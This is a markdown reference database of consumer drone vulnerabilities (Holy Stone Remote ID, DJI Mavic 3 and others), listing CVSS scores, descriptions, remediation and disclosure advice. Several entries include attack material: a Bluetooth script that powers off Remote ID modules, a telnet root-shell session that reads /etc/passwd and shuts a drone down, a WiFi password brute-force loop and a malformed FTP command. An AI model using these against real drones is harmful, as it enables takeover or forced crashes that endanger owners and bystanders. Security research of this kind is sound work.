# Drone CVE Database

> A comprehensive database of documented drone vulnerabilities with technical details, exploitation methods, and remediation guidance.

---

## CVE Index

| CVE ID | Severity | CVSS | Product | Status |
|--------|----------|------|---------|--------|
| [CVE-2024-52876](#cve-2024-52876) | HIGH | 7.5 | Holy Stone Remote ID | Patched |
| [CVE-2024-6422](#cve-2024-6422) | CRITICAL | 9.8 | Consumer UAV | Vendor Notified |
| [CVE-2023-6951](#cve-2023-6951) | MEDIUM | 6.6 | DJI Mavic 3 | Patched |
| [CVE-2023-6948](#cve-2023-6948) | LOW | 3.0 | DJI Mavic 3 | Patched |
| [CVE-2023-51454](#cve-2023-51454) | MEDIUM | 6.8 | DJI Mavic 3 | Patched |
| [CVE-2023-51455](#cve-2023-51455) | MEDIUM | 6.8 | DJI Mavic 3 | Patched |
| [CVE-2023-51456](#cve-2023-51456) | MEDIUM | 6.8 | DJI Mavic 3 | Patched |
| [CVE-2023-51452](#cve-2023-51452) | LOW | 3.0 | DJI Mavic 3 | Patched |
| [CVE-2023-51453](#cve-2023-51453) | LOW | 3.0 | DJI Mavic 3 | Patched |

---

## CVE-2024-52876

### Holy Stone Remote ID Module - Unauthenticated Remote Power Off

| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2024-52876 |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 (CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N) |
| **Affected Product** | Holy Stone Remote ID Module HSRID01 |
| **Affected Versions** | Firmware distributed with Drone Go2 app < 1.1.8 |
| **Discovered** | 2024-07-07 |
| **Disclosed** | 2024-11-17 |
| **Status** | Patched (October 2024) |

#### Description

The Holy Stone Remote ID Module HSRID01 is vulnerable to an unauthenticated remote power off attack when configured for broadcast mode. An attacker can exploit this vulnerability by connecting to the module over Bluetooth and performing multiple read operations on the ASTM Remote ID (0xFFFA) GATT characteristic.

#### Technical Details

**Attack Vector:**
1. Scan for Bluetooth devices with Remote ID service
2. Connect to target device without authentication
3. Perform multiple read operations on GATT characteristic 0xFFFA
4. Device enters fault state and powers off

**Vulnerability Type:** CWE-125: Out-of-bounds Read

**Bluetooth Service:**
```
Service UUID: 0xFFFA (ASTM Remote ID)
Characteristic: Multiple reads trigger buffer over-read
Result: Denial of Service (power off)
```

#### Proof of Concept

```python
# WARNING: For educational purposes only
# Do not use against systems without authorization

import asyncio
from bleak import BleakClient, BleakScanner

REMOTE_ID_SERVICE = "0000fffa-0000-1000-8000-00805f9b34fb"

async def exploit():
    # Scan for Remote ID devices
    devices = await BleakScanner.discover()
    for device in devices:
        if "HSRID" in device.name or "HolyStone" in device.name:
            async with BleakClient(device) as client:
                # Multiple reads trigger the vulnerability
                for _ in range(10):
                    try:
                        await client.read_gatt_char(REMOTE_ID_SERVICE)
                    except:
                        print("Device powered off!")
                        break
```

#### Remediation

1. **Immediate**: Update to Drone Go2 app version 1.1.8 or later
2. **Mitigation**: Disable Remote ID when not required by regulations
3. **Long-term**: Implement authentication for Bluetooth GATT operations

#### References

- [Coalfire Disclosure](https://coalfire.com/the-coalfire-blog/holy-stone-remote-id-vulnerability-disclosure)
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2024-52876)

---

## CVE-2024-6422

### Consumer UAV - Unauthenticated Telnet Access

| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2024-6422 |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **Affected Product** | Multiple Consumer UAV Models |
| **Discovered** | 2024-07-01 |
| **Status** | Vendor Notified |

#### Description

An unauthenticated remote attacker can manipulate the device via Telnet, stop processes, read, delete and change data. The affected drones expose Telnet service on port 23 without any authentication mechanism.

#### Technical Details

**Attack Vector:**
```
Attacker → [WiFi Connection] → Drone AP → [Telnet:23] → Root Shell
```

**Vulnerability Type:** CWE-306: Missing Authentication for Critical Function

#### Exploitation

```bash
# Connect to drone WiFi (often open or weak password)
# Then:
$ telnet 192.168.1.1
Connected to 192.168.1.1.
BusyBox v1.23.2 built-in shell
/ # id
uid=0(root) gid=0(root)
/ # ls /
bin   dev   etc   lib   mnt   proc  root  sbin  sys   tmp   usr   var

# Attacker now has full root access
/ # cat /etc/passwd
/ # shutdown now  # Force landing
```

#### Impact

- **Confidentiality**: Read all files, flight logs, captured media
- **Integrity**: Modify configuration, install backdoors
- **Availability**: Shutdown drone mid-flight, delete data

#### Remediation

1. Disable Telnet service in production firmware
2. If Telnet required, implement strong authentication
3. Use SSH with key-based authentication instead

---

## CVE-2023-6951

### DJI Mavic 3 - Weak WiFi Password Generation

| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2023-6951 |
| **Severity** | MEDIUM |
| **CVSS Score** | 6.6 (AV:A/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N) |
| **Affected Product** | DJI Mavic 3 Series (QuickTransfer Mode) |
| **Discovered** | 2024-04-04 |
| **Status** | Patched |

#### Description

The DJI Mavic 3 generates weak WiFi passwords for QuickTransfer Mode using a flawed random number generator. The password is generated as an 8-character hexadecimal string ([0-9a-f]) using libc's `random()` function called only four times.

#### Technical Details

**Vulnerable Code Pattern:**
```c
// Decompiled from /system/bin/dji_network
void generate_default_passwd() {
    char password[9];
    for (int i = 0; i < 4; i++) {
        int rand_val = random() % 256;
        sprintf(&password[i*2], "%02x", rand_val);
    }
    password[8] = '\0';
    // Password is only 8 hex chars = 32 bits of entropy
}
```

**Entropy Analysis:**
- Character set: 16 characters (0-9, a-f)
- Password length: 8 characters
- Total combinations: 16^8 = 4,294,967,296
- **Brute force time: ~1-2 hours** with modern tools

#### Exploitation

```python
import itertools
import subprocess

# Generate all possible 8-char hex passwords
charset = '0123456789abcdef'
for pwd in itertools.product(charset, repeat=8):
    password = ''.join(pwd)
    # Attempt connection with wpa_supplicant or similar
    result = try_connect("Mavic3_AP", password)
    if result:
        print(f"Password found: {password}")
        break
```

#### Remediation

- Update DJI Fly app and drone firmware to latest version
- Avoid using QuickTransfer Mode in sensitive environments
- Use wired connection for media transfer when possible

---

## CVE-2023-51454, CVE-2023-51455, CVE-2023-51456

### DJI Mavic 3 - vtwo_sdk Memory Corruption Vulnerabilities

| Field | Value |
|-------|-------|
| **CVE IDs** | CVE-2023-51454, CVE-2023-51455, CVE-2023-51456 |
| **Severity** | MEDIUM |
| **CVSS Score** | 6.8 (AV:A/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H) |
| **Affected Product** | DJI Mavic 3 Series |
| **Status** | Patched |

#### Description

Multiple memory corruption vulnerabilities in the `vtwo_sdk` service running on DJI Mavic 3 drones. The service uses a custom TLV-based protocol over TCP and is vulnerable to:

- **CVE-2023-51454**: Out-of-Bounds Write
- **CVE-2023-51455**: Out-of-Bounds Write (different code path)
- **CVE-2023-51456**: Array-Index-Out-Of-Bounds

#### Technical Details

**Service Location:** `/system/bin/vtwo_sdk`

**Protocol:** Custom TLV (Type-Length-Value) over TCP

**Attack Surface:** Accessible via QuickTransfer WiFi connection

#### Exploitation Requirements

1. Target must have QuickTransfer Mode enabled
2. Attacker must be connected to drone WiFi
3. User interaction required (enabled WiFi mode)

#### Potential Impact

These vulnerabilities could potentially lead to:
- Arbitrary code execution
- Information disclosure
- Complete drone compromise

#### Remediation

Update to latest DJI Mavic 3 firmware via DJI Fly app.

---

## CVE-2023-6948, CVE-2023-51452, CVE-2023-51453

### DJI Mavic 3 - FTP Service Denial of Service

| Field | Value |
|-------|-------|
| **CVE IDs** | CVE-2023-6948, CVE-2023-51452, CVE-2023-51453 |
| **Severity** | LOW |
| **CVSS Score** | 3.0 (AV:A/AC:L/PR:L/UI:R/S:U/C:N/I:N/A:L) |
| **Status** | Patched |

#### Description

The FTP service on DJI Mavic 3 is vulnerable to denial of service attacks via malformed requests. A malformed SIZE request can trigger a persistent crash requiring device reboot.

#### Technical Details

**Trigger:** Send malformed SIZE FTP command
**Effect:** Service crash (Android FORTIFY protection triggered)
**Recovery:** Requires drone reboot

#### Exploitation

```bash
$ ftp 192.168.1.1
ftp> SIZE ../../../../etc/passwd
# Service crashes
```

---

## Historical Vulnerabilities

### Parrot AR.Drone Series (2012-2016)

| Issue | Description |
|-------|-------------|
| Open WiFi | No encryption on access point |
| Anonymous FTP | Full filesystem access without authentication |
| Telnet Root | Root shell without password |
| Unencrypted Video | RTSP stream accessible to all |

### DJI Phantom 3 (2016-2017)

| Issue | Description |
|-------|-------------|
| Default WiFi Password | `12341234` for all units |
| FTP Chroot Escape | Pre-V01.07.0090 firmware allowed filesystem traversal |
| Debug Ports | ADB accessible |

---

## Reporting New Vulnerabilities

If you discover a new drone vulnerability:

1. **Do NOT publicly disclose** before vendor notification
2. Follow responsible disclosure practices (90-day timeline)
3. Report to vendor security team first
4. Consider reporting to:
   - [MITRE CVE](https://cveform.mitre.org/)
   - [NVD](https://nvd.nist.gov/)
   - [CERT/CC](https://www.kb.cert.org/vuls/report/)

---

## References

- [NVD - National Vulnerability Database](https://nvd.nist.gov/)
- [CVE - Common Vulnerabilities and Exposures](https://cve.mitre.org/)
- [Nozomi Networks - DJI Research](https://www.nozominetworks.com/blog/dji-mavic-3-drone-research-part-1-firmware-analysis)
- [Coalfire - Holy Stone Disclosure](https://coalfire.com/the-coalfire-blog/holy-stone-remote-id-vulnerability-disclosure)
